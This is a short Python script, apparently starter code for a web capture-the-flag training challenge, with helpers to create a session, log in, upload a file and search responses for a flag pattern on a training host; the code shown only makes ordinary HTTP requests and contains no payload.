import requests
import string
import random
import re


url = "http://lolshop.training.jinblack.it"

def find_flag(data):
	search = re.search("flag{[a-zA-Z1-9_!]+}", data)
	if search:
		print(search.group())
	  

def gen_ran_string(size=15):
	return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(size))

def create_session(s, n, e):
	data = {"name": n, "email": e}
	return s.post(url+"/api/new_session.php", data=data).text

def login(s, u, p):
	data = {"username": u, "password": p, "log_user": ""}
	return s.post(url+"/login.php", data=data).text

def upload_file(s, fieldname, file):
	files = {fieldname: file}
	return s.post(url+"/upload_user.php", files=files).text

n = gen_ran_string()
e = gen_ran_string()+"@"+gen_ran_string()
s = requests.Session()

print(create_session(s, n, e))
